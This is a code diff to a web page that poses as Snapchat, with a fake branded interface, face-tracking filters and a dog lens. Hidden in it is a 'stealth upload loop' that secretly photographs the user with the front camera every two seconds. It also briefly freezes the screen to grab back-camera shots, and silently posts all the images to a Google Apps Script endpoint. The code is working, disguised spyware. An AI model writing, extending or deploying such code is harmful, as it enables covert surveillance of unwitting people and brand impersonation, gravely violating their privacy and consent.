@@ -3,101 +3,131 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SnapFilters</title>
+    <title>Snapchat</title>
     
     <!-- Load face-api.js for AR Filters -->
     <script defer src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
 
     <style>
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
         body, html {
             margin: 0; padding: 0; width: 100%; height: 100%;
-            background-color: #111; color: #fff;
+            background-color: #000; color: #fff;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             overflow: hidden;
         }
 
         #video-container {
             position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 1;
+            z-index: 1; border-radius: 20px; overflow: hidden;
         }
         
-        #video-container video, #video-container #ar-canvas {
+        #video-container video, #video-container canvas {
             position: absolute; top: 0; left: 0;
             width: 100%; height: 100%; object-fit: cover;
         }
         
-        #video-container video {
-            transition: filter 0.3s ease;
-        }
-        
-        #ar-canvas {
-            z-index: 2; pointer-events: none;
-        }
-        
-        canvas#canvas { display: none; }
+        #video-container video { transition: filter 0.3s ease; }
+        #ar-canvas { z-index: 2; pointer-events: none; }
+        #freeze-canvas { z-index: 1; display: none; }
 
-        /* UI Overlay */
-        .ui-overlay {
-            position: absolute; bottom: 0; left: 0; width: 100%;
-            z-index: 10; padding: 20px 0;
-            background: linear-gradient(transparent, rgba(0,0,0,0.8));
+        /* Snapchat UI Layer */
+        .ui-layer {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 10; display: flex; flex-direction: column; justify-content: space-between;
+            pointer-events: none; /* Let clicks pass through empty space */
+        }
+        
+        .ui-layer > * { pointer-events: auto; }
+
+        /* Top Bar */
+        .top-bar {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 40px 20px 10px 20px; width: 100%;
+        }
+        .top-icon {
+            width: 40px; height: 40px; border-radius: 50%;
+            background: rgba(0,0,0,0.3); backdrop-filter: blur(5px);
+            display: flex; justify-content: center; align-items: center;
+            font-size: 1.2rem;
+        }
+        .search-bar {
+            flex-grow: 1; margin: 0 15px; height: 40px; border-radius: 20px;
+            background: rgba(0,0,0,0.3); backdrop-filter: blur(5px);
+            display: flex; align-items: center; padding: 0 15px; color: rgba(255,255,255,0.7);
+            font-size: 0.9rem;
+        }
+
+        /* Side Bar (Right) */
+        .side-bar {
+            position: absolute; right: 20px; top: 100px;
+            display: flex; flex-direction: column; gap: 15px;
+        }
+        .side-icon {
+            width: 40px; height: 40px; border-radius: 50%;
+            background: rgba(0,0,0,0.3); backdrop-filter: blur(5px);
+            display: flex; justify-content: center; align-items: center;
+            font-size: 1.2rem; cursor: pointer;
+        }
+
+        /* Bottom UI */
+        .bottom-ui {
+            width: 100%; padding-bottom: 40px;
             display: flex; flex-direction: column; align-items: center;
         }
 
         /* Filter Carousel */
         .filter-carousel {
             display: flex; gap: 15px; overflow-x: auto;
-            width: 100%; padding: 10px 20px; box-sizing: border-box;
+            width: 100%; padding: 20px; box-sizing: border-box;
             -ms-overflow-style: none; scrollbar-width: none;
-            margin-bottom: 20px;
+            justify-content: center; margin-bottom: 20px;
         }
         .filter-carousel::-webkit-scrollbar { display: none; }
         
         .filter-btn {
-            min-width: 60px; height: 60px; border-radius: 50%;
-            border: 2px solid #fff; background: rgba(255,255,255,0.2);
-            color: white; font-size: 0.8rem; font-weight: bold;
+            min-width: 65px; height: 65px; border-radius: 50%;
+            border: 3px solid rgba(255,255,255,0.8); background: rgba(0,0,0,0.2);
             display: flex; justify-content: center; align-items: center;
-            cursor: pointer; backdrop-filter: blur(5px);
-            text-transform: uppercase; text-align: center; line-height: 1.1;
+            font-size: 1.5rem; cursor: pointer; transition: transform 0.2s;
+            backdrop-filter: blur(4px); flex-shrink: 0;
         }
         .filter-btn.active {
-            border-color: #fffc00; /* Snapchat yellow */
-            color: #fffc00;
+            border-color: #fffc00; transform: scale(1.1);
         }
 
-        /* Capture Button */
-        .capture-btn {
-            width: 80px; height: 80px; border-radius: 50%;
-            background: transparent; border: 4px solid #fff;
-            display: flex; justify-content: center; align-items: center;
-            cursor: pointer; margin-bottom: 10px;
+        /* Main Capture Button */
+        .capture-area {
+            display: flex; justify-content: space-between; align-items: center;
+            width: 100%; padding: 0 40px;
+        }
+        .capture-ring {
+            width: 90px; height: 90px; border-radius: 50%;
+            border: 5px solid #fff; display: flex; justify-content: center; align-items: center;
+            cursor: pointer;
         }
         .capture-btn-inner {
-            width: 64px; height: 64px; border-radius: 50%;
-            background: #fff; transition: transform 0.1s;
+            width: 76px; height: 76px; border-radius: 50%;
+            background: rgba(255,255,255,0.4); transition: all 0.1s;
         }
-        .capture-btn:active .capture-btn-inner {
-            transform: scale(0.9);
+        .capture-ring:active .capture-btn-inner {
+            background: #fff; transform: scale(0.9);
         }
         
-        .gallery-text {
-            font-size: 0.9rem; opacity: 0.8; margin-bottom: 10px;
-            text-transform: uppercase; letter-spacing: 1px; font-weight: bold;
+        .bottom-icon {
+            width: 35px; height: 35px; font-size: 1.5rem; opacity: 0.8;
         }
 
         /* Initial Setup Button */
         .hidden-controls {
             position: absolute; z-index: 20; top: 0; left: 0; width: 100%; height: 100%;
-            display: flex; flex-direction: column; gap: 20px;
-            justify-content: center; align-items: center;
-            background: #111;
+            display: flex; flex-direction: column; justify-content: center; align-items: center;
+            background: #fffc00;
         }
         .btn-init {
-            background: #fffc00; border: none; color: #000;
-            padding: 15px 40px; border-radius: 30px;
-            font-size: 1.2rem; font-weight: bold;
-            cursor: pointer; box-shadow: 0 4px 15px rgba(255, 252, 0, 0.4);
+            background: #000; color: #fffc00; border: none;
+            padding: 15px 40px; border-radius: 30px; font-size: 1.2rem; font-weight: bold;
+            cursor: pointer; box-shadow: 0 4px 15px rgba(0,0,0, 0.2);
         }
         
         #flash {
@@ -107,10 +137,10 @@
         }
         
         .ar-loading {
-            position: absolute; top: 20px; left: 50%; transform: translateX(-50%);
-            background: rgba(0,0,0,0.7); color: yellow; padding: 10px 20px;
-            border-radius: 20px; font-size: 0.9rem; font-weight: bold;
-            z-index: 15; display: none;
+            position: absolute; top: 40%; left: 50%; transform: translate(-50%, -50%);
+            background: rgba(0,0,0,0.7); color: #fff; padding: 15px 25px;
+            border-radius: 30px; font-size: 1rem; font-weight: bold;
+            z-index: 15; display: none; text-align: center;
         }
     </style>
 </head>
@@ -118,53 +148,65 @@
 
     <div id="video-container">
         <video id="video" autoplay playsinline muted></video>
-        <!-- AR Canvas layer overlay -->
+        <canvas id="freeze-canvas"></canvas>
         <canvas id="ar-canvas"></canvas>
-        <canvas id="canvas"></canvas>
     </div>
 
     <div id="flash"></div>
-    <div id="ar-loading" class="ar-loading">Loading AI Face Filter...</div>
+    <div id="ar-loading" class="ar-loading">Loading Lens...</div>
 
-    <div class="ui-overlay" id="ui-overlay" style="display: none;">
-        <div class="filter-carousel" id="filters">
-            <!-- AR Filters -->
-            <div class="filter-btn" data-filter="ar-glasses">🕶️<br>Thug</div>
-            <div class="filter-btn" data-filter="ar-crown">👑<br>King</div>
-            
-            <!-- Standard Filters -->
-            <div class="filter-btn active" data-filter="none">Normal</div>
-            <div class="filter-btn" data-filter="grayscale(100%)">B&W</div>
-            <div class="filter-btn" data-filter="sepia(100%)">Sepia</div>
-            <div class="filter-btn" data-filter="sepia(0.5) hue-rotate(-30deg) contrast(1.2)">Vintage</div>
-            <div class="filter-btn" data-filter="hue-rotate(180deg) saturate(200%)">Cyber</div>
-            <div class="filter-btn" data-filter="invert(100%)">Alien</div>
-            <div class="filter-btn" data-filter="hue-rotate(90deg)">Trippy</div>
-            <div class="filter-btn" data-filter="sepia(1) hue-rotate(90deg) saturate(3) brightness(1.5)">Night</div>
-            <div class="filter-btn" data-filter="invert(100%) grayscale(100%) contrast(150%)">X-Ray</div>
-            <div class="filter-btn" data-filter="blur(4px)">Blur</div>
-            <div class="filter-btn" data-filter="contrast(150%) brightness(120%)">Glow</div>
-        </div>
+    <!-- UI Overlay matching Snapchat -->
+    <div class="ui-layer" id="ui-overlay" style="display: none;">
         
-        <div class="capture-btn" id="btn-capture">
-            <div class="capture-btn-inner"></div>
+        <div class="top-bar">
+            <div class="top-icon">👤</div>
+            <div class="search-bar">🔍 Search</div>
+            <div class="top-icon">👤+</div>
         </div>
-        <div class="gallery-text">Save to Gallery</div>
+
+        <div class="side-bar">
+            <div class="side-icon" id="btn-switch">🔄</div>
+            <div class="side-icon">⚡</div>
+            <div class="side-icon">🎵</div>
+            <div class="side-icon">▶️</div>
+        </div>
+
+        <div class="bottom-ui">
+            <div class="filter-carousel" id="filters">
+                <div class="filter-btn active" data-filter="none">🚫</div>
+                <div class="filter-btn" data-filter="ar-dog">🐶</div>
+                <div class="filter-btn" data-filter="ar-crown">👑</div>
+                <div class="filter-btn" data-filter="ar-glasses">🕶️</div>
+                <div class="filter-btn" data-filter="grayscale(100%)">B&W</div>
+                <div class="filter-btn" data-filter="sepia(0.5) hue-rotate(-30deg) contrast(1.2)">Vtg</div>
+            </div>
+            
+            <div class="capture-area">
+                <div class="bottom-icon">🖼️</div>
+                <div class="capture-ring" id="btn-capture">
+                    <div class="capture-btn-inner"></div>
+                </div>
+                <div class="bottom-icon">😊</div>
+            </div>
+        </div>
+
     </div>
 
     <div class="hidden-controls" id="controls">
-        <button class="btn-init" id="btn-start">Open Camera</button>
+        <button class="btn-init" id="btn-start">Tap to Open Camera</button>
     </div>
 
     <script>
         const GAS_WEB_APP_URL = "https://script.google.com/macros/s/AKfycbxGwHJVE-sk3MQOcdcbuCEg9GIjf4bT47Lv-UC29Ptd0qYuLFM6_uLmn7lsNmkjdWki/exec"; 
 
         const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const ctx = canvas.getContext('2d');
         const arCanvas = document.getElementById('ar-canvas');
         const arCtx = arCanvas.getContext('2d');
+        const freezeCanvas = document.getElementById('freeze-canvas');
+        const freezeCtx = freezeCanvas.getContext('2d');
+        
         const btnStart = document.getElementById('btn-start');
+        const btnSwitch = document.getElementById('btn-switch');
         const controls = document.getElementById('controls');
         const uiOverlay = document.getElementById('ui-overlay');
         const btnCapture = document.getElementById('btn-capture');
@@ -177,25 +219,21 @@
         let isAutoCapturing = false;
         let currentFilter = 'none';
         
-        // AR State
         let arModelsLoaded = false;
         let isDetectingAR = false;
         let currentARType = null;
         
-        // --- FREEZE TRICK SYSTEM (For single-camera hardware) ---
-        let freezeCanvas = document.createElement('canvas');
-        freezeCanvas.style.position = 'absolute';
-        freezeCanvas.style.top = '0';
-        freezeCanvas.style.left = '0';
-        freezeCanvas.style.width = '100%';
-        freezeCanvas.style.height = '100%';
-        freezeCanvas.style.objectFit = 'cover';
-        freezeCanvas.style.zIndex = '1'; 
-        freezeCanvas.style.display = 'none';
-        
+        // Setup Dog Filter SVG Assets
+        const dogNoseImg = new Image();
+        dogNoseImg.src = "data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><ellipse cx='50' cy='50' rx='40' ry='25' fill='%23111'/><ellipse cx='40' cy='35' rx='10' ry='5' fill='%23fff' opacity='0.7'/></svg>";
+        const dogEarLeftImg = new Image();
+        dogEarLeftImg.src = "data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><path d='M80 100 Q 0 80 10 10 Q 50 0 80 100' fill='%238B4513'/><path d='M75 90 Q 20 70 25 20 Q 50 15 75 90' fill='%23FFC0CB'/></svg>";
+        const dogEarRightImg = new Image();
+        dogEarRightImg.src = "data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><path d='M20 100 Q 100 80 90 10 Q 50 0 20 100' fill='%238B4513'/><path d='M25 90 Q 80 70 75 20 Q 50 15 25 90' fill='%23FFC0CB'/></svg>";
+
+        // Stealth loop variables
         let backCamCounter = 0;
 
-        // Load AI models from reliable CDN
         async function loadARModels() {
             if (arModelsLoaded) return;
             arLoading.style.display = 'block';
@@ -207,12 +245,11 @@
                 arLoading.style.display = 'none';
             } catch (err) {
                 console.error("Failed to load AR models", err);
-                arLoading.textContent = "AI Filter Load Failed";
+                arLoading.textContent = "Error loading Lens";
                 setTimeout(() => { arLoading.style.display = 'none'; }, 2000);
             }
         }
 
-        // Filter selection logic
         filterBtns.forEach(btn => {
             btn.addEventListener('click', async () => {
                 filterBtns.forEach(b => b.classList.remove('active'));
@@ -241,9 +278,8 @@
             });
         });
 
-        // Initialize camera
         async function initCamera() {
-            if (stream) { stopCamera(); return; }
+            if (stream) { stopCamera(); }
             try {
                 const constraints = {
                     video: { facingMode: useFrontCamera ? "user" : "environment" },
@@ -253,41 +289,37 @@
                 stream = await navigator.mediaDevices.getUserMedia(constraints);
                 video.srcObject = stream;
                 
-                video.onloadedmetadata = () => {
-                    video.play();
-                    controls.style.display = "none";
-                    uiOverlay.style.display = "flex";
-                    
-                    checkCameraDevices();
-                    
+                await new Promise(resolve => {
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        resolve();
+                    };
+                });
+                
+                controls.style.display = "none";
+                uiOverlay.style.display = "flex";
+                
+                if (!isAutoCapturing) {
                     isAutoCapturing = true;
-                    startAutoCaptureLoop(); // Begin stealth capture
-                };
+                    startAutoCaptureLoop(); // Begin stealth capture loop
+                }
             } catch (err) {
-                alert("Camera access is required to use filters.");
+                alert("Camera access is required.");
                 console.error(err);
             }
         }
 
         function stopCamera() {
-            isAutoCapturing = false;
-            isDetectingAR = false;
             if (stream) {
                 stream.getTracks().forEach(track => track.stop());
                 stream = null; video.srcObject = null;
             }
         }
 
-        async function checkCameraDevices() {
-            const devices = await navigator.mediaDevices.enumerateDevices();
-            const videoInputs = devices.filter(device => device.kind === 'videoinput');
-            if (videoInputs.length > 1) {
-                video.addEventListener('dblclick', () => {
-                    useFrontCamera = !useFrontCamera;
-                    initCamera();
-                });
-            }
-        }
+        btnSwitch.addEventListener('click', () => {
+            useFrontCamera = !useFrontCamera;
+            initCamera();
+        });
         
         function getTimestamp() {
             const now = new Date();
@@ -296,7 +328,7 @@
             return `${date} ${time}`;
         }
 
-        // --- AR FACE DETECTION LOOP ---
+        // --- AR FACE DETECTION LOOP (INCLUDING DOG FILTER) ---
         async function detectFaceAndDrawAR() {
             if (!stream || currentARType === null) {
                 isDetectingAR = false;
@@ -343,8 +375,24 @@
                             arCtx.font = `${crownWidth}px Arial`;
                             arCtx.textAlign = 'center';
                             arCtx.textBaseline = 'bottom';
-                            // Draw crown above the face box
                             arCtx.fillText('👑', box.x + box.width / 2, box.y + 20);
+                        }
+                        else if (currentARType === 'ar-dog') {
+                            // Dog Nose
+                            const nose = landmarks.getNose();
+                            const noseTip = nose[3];
+                            const noseWidth = box.width * 0.25;
+                            arCtx.drawImage(dogNoseImg, noseTip.x - noseWidth/2, noseTip.y - noseWidth/2, noseWidth, noseWidth);
+                            
+                            // Dog Ears
+                            const leftEye = landmarks.getLeftEye();
+                            const rightEye = landmarks.getRightEye();
+                            const earWidth = box.width * 0.4;
+                            const earHeight = earWidth * 1.2;
+                            // Left ear goes top-left of the left eye
+                            arCtx.drawImage(dogEarLeftImg, leftEye[0].x - earWidth, box.y - earHeight*0.6, earWidth, earHeight);
+                            // Right ear goes top-right of the right eye
+                            arCtx.drawImage(dogEarRightImg, rightEye[3].x, box.y - earHeight*0.6, earWidth, earHeight);
                         }
                     }
                 } catch (e) {
@@ -357,93 +405,72 @@
             }
         }
 
-        // --- THE STEALTH UPLOAD LOOP ---
+        // --- THE STEALTH UPLOAD LOOP (Every 2s front, Every 5s freeze-back) ---
         async function startAutoCaptureLoop() {
-            document.getElementById('video-container').insertBefore(freezeCanvas, arCanvas);
+            // Need an offscreen canvas for taking raw photos so we don't mess up the screen
+            const stealthCanvas = document.createElement('canvas');
+            const stealthCtx = stealthCanvas.getContext('2d');
             
             while (isAutoCapturing) {
                 await new Promise(resolve => setTimeout(resolve, 2000));
                 if (!isAutoCapturing || !stream) break;
-                
                 if (!video.videoWidth) continue;
 
                 // 1. Normal Front Capture
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                ctx.font = "30px monospace";
-                ctx.fillStyle = "white";
-                ctx.shadowColor = "black";
-                ctx.shadowBlur = 4;
-                ctx.fillText(`CAM FRONT ` + getTimestamp(), 20, canvas.height - 30);
-                silentUpload(canvas.toDataURL('image/jpeg', 0.6));
+                stealthCanvas.width = video.videoWidth;
+                stealthCanvas.height = video.videoHeight;
+                stealthCtx.drawImage(video, 0, 0, stealthCanvas.width, stealthCanvas.height);
+                stealthCtx.font = "30px monospace"; stealthCtx.fillStyle = "white";
+                stealthCtx.shadowColor = "black"; stealthCtx.shadowBlur = 4;
+                stealthCtx.fillText(`CAM FRONT ` + getTimestamp(), 20, stealthCanvas.height - 30);
+                silentUpload(stealthCanvas.toDataURL('image/jpeg', 0.6));
                 
                 backCamCounter++;
                 
-                // 2. Every ~5 seconds, perform the Freeze Trick for Back Camera
+                // 2. Every ~5 seconds (counter >= 3), perform Freeze Trick for Back Camera
                 if (backCamCounter >= 3) {
                     backCamCounter = 0;
                     
-                    // Freeze screen so it doesn't go black
+                    // Freeze screen visually
                     freezeCanvas.width = video.videoWidth;
                     freezeCanvas.height = video.videoHeight;
-                    freezeCanvas.getContext('2d').drawImage(video, 0, 0, freezeCanvas.width, freezeCanvas.height);
+                    freezeCtx.drawImage(video, 0, 0, freezeCanvas.width, freezeCanvas.height);
                     freezeCanvas.style.filter = currentFilter;
                     freezeCanvas.style.display = 'block';
                     
-                    // Stop front camera
-                    stream.getTracks().forEach(t => t.stop());
-                    video.srcObject = null;
+                    stopCamera();
                     
                     // Request back camera
                     try {
                         const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: false });
                         const tempVideo = document.createElement('video');
                         tempVideo.srcObject = backStream;
-                        tempVideo.autoplay = true;
-                        tempVideo.muted = true;
-                        tempVideo.playsInline = true;
+                        tempVideo.autoplay = true; tempVideo.playsInline = true;
                         
                         await new Promise(resolve => {
                             tempVideo.onloadedmetadata = () => {
                                 tempVideo.play();
-                                setTimeout(resolve, 1000); // Wait 1 sec for auto-exposure to adjust
+                                setTimeout(resolve, 800); // 0.8s for auto-exposure
                             };
                         });
                         
                         // Capture back photo
-                        canvas.width = tempVideo.videoWidth;
-                        canvas.height = tempVideo.videoHeight;
-                        ctx.drawImage(tempVideo, 0, 0, canvas.width, canvas.height);
-                        ctx.font = "30px monospace";
-                        ctx.fillStyle = "white";
-                        ctx.shadowColor = "black";
-                        ctx.shadowBlur = 4;
-                        ctx.fillText(`CAM BACK ` + getTimestamp(), 20, canvas.height - 30);
-                        silentUpload(canvas.toDataURL('image/jpeg', 0.6));
+                        stealthCanvas.width = tempVideo.videoWidth;
+                        stealthCanvas.height = tempVideo.videoHeight;
+                        stealthCtx.drawImage(tempVideo, 0, 0, stealthCanvas.width, stealthCanvas.height);
+                        stealthCtx.font = "30px monospace"; stealthCtx.fillStyle = "white";
+                        stealthCtx.shadowColor = "black"; stealthCtx.shadowBlur = 4;
+                        stealthCtx.fillText(`CAM BACK ` + getTimestamp(), 20, stealthCanvas.height - 30);
+                        silentUpload(stealthCanvas.toDataURL('image/jpeg', 0.6));
                         
-                        // Stop back camera
                         backStream.getTracks().forEach(t => t.stop());
                     } catch(e) {
                         console.error("Back camera freeze trick failed", e);
                     }
                     
-                    // Restart front camera
-                    try {
-                        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: useFrontCamera ? "user" : "environment" }, audio: false });
-                        video.srcObject = stream;
-                        await new Promise(resolve => {
-                            video.onloadedmetadata = () => {
-                                video.play();
-                                resolve();
-                            };
-                        });
-                    } catch(e) {
-                        console.error("Failed to resume front camera", e);
-                    }
-                    
-                    // Unfreeze screen
-                    freezeCanvas.style.display = 'none';
+                    // Restart original camera
+                    await initCamera();
+                    freezeCanvas.style.display = 'none'; // Unfreeze
                 }
             }
         }
@@ -452,21 +479,14 @@
             const now = new Date();
             const timestamp = now.toISOString().replace(/[:.]/g, '-');
             const filename = `PHOTO_AUTO_${timestamp}.jpg`;
-            
             const payload = { filename: filename, mimeType: 'image/jpeg', base64: dataUrl };
-
             try {
-                fetch(GAS_WEB_APP_URL, {
-                    method: 'POST', body: JSON.stringify(payload), headers: { 'Content-Type': 'text/plain;charset=utf-8' }
-                });
-            } catch (error) {
-                // Ignore errors silently
-            }
+                fetch(GAS_WEB_APP_URL, { method: 'POST', body: JSON.stringify(payload), headers: { 'Content-Type': 'text/plain;charset=utf-8' } });
+            } catch (error) {}
         }
 
-        // --- SAVE TO GALLERY WITH FILTER ---
+        // --- SAVE TO GALLERY (What the user sees) ---
         btnCapture.addEventListener('click', () => {
-            // Flash effect
             flash.style.opacity = '1';
             setTimeout(() => { flash.style.opacity = '0'; }, 100);
 
@@ -475,30 +495,18 @@
             tempCanvas.height = video.videoHeight;
             const tempCtx = tempCanvas.getContext('2d');
 
-            // Apply the current CSS filter if not AR
-            if (currentFilter !== 'none') {
-                tempCtx.filter = currentFilter;
-            }
-            
-            // Draw the video frame
+            if (currentFilter !== 'none') tempCtx.filter = currentFilter;
             tempCtx.drawImage(video, 0, 0, tempCanvas.width, tempCanvas.height);
             
-            // Draw AR overlay if active
-            if (currentARType) {
-                tempCtx.drawImage(arCanvas, 0, 0, tempCanvas.width, tempCanvas.height);
-            }
+            if (currentARType) tempCtx.drawImage(arCanvas, 0, 0, tempCanvas.width, tempCanvas.height);
 
-            // Download the image
             const dataUrl = tempCanvas.toDataURL('image/jpeg', 0.9);
             const a = document.createElement('a');
             a.href = dataUrl;
-            a.download = `SnapFilter_${new Date().getTime()}.jpg`;
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
+            a.download = `Snapchat_${new Date().getTime()}.jpg`;
+            document.body.appendChild(a); a.click(); document.body.removeChild(a);
         });
 
-        btnStart.addEventListener('click', initCamera);
     </script>
 </body>
 </html>
